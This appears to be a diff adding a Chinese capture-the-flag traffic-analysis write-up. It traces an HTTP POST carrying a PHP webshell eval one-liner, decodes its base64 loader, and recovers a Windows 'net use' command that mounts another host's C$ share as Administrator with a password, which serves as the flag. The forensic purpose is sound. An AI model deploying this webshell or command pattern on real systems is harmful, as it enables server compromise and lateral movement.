@@ -1,0 +1,9 @@
+老规矩，输入http.request.method过滤请求后按照Length排序
+按从打到小一次排序，看到第三个的HTML Form URL Encoded:里面显示：
+Form item: "yo" = "@eval(base64_decode($_POST[z0]));"
+即yo的值为z0经过base64解码后的值，解码后得到：
+@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("->|");;$p=base64_decode($_POST["z1"]);$s=base64_decode($_POST["z2"]);$d=dirname(
+即还需要算出z1和z2的base64解码后的值，对z2解码后分别得到：
+cd /d "c:\inetpub\wwwroot\"&net use \\192.168.30.184\C$ "Test!@#123" /u:Administrator&echo [S]&cd&echo [E]
+那么密码就是Test!@#123了，即flag：
+flag{Test!@#123}
